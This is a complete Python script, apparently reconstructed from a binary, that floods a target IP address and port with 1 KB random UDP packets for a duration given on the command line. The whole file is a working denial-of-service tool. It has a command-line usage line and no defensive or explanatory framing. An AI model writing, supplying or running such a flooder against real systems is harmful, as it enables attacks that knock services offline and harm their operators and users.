import socket
import time
import random
import sys

def udp_flood(target_ip, target_port, duration):
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generate random data to send (packet size can be adjusted)
    # A larger packet size might be more effective but also more bandwidth-intensive
    # The original binary likely sent small packets, so we'll start with that.
    data = random._urandom(1024) # 1KB random data

    timeout = time.time() + duration
    sent_packets = 0

    print(f"Starting UDP flood to {target_ip}:{target_port} for {duration} seconds...")

    while True:
        if time.time() > timeout:
            break
        try:
            sock.sendto(data, (target_ip, target_port))
            sent_packets += 1
        except socket.error as e:
            # Handle potential errors like network unreachable, etc.
            # For a simple flooder, we might just log and continue
            # print(f"Socket error: {e}")
            pass
    
    print(f"UDP flood completed. Sent {sent_packets} packets.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 udp_flooder.py <target_ip> <target_port> <duration_seconds>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])

    udp_flood(target_ip, target_port, duration)
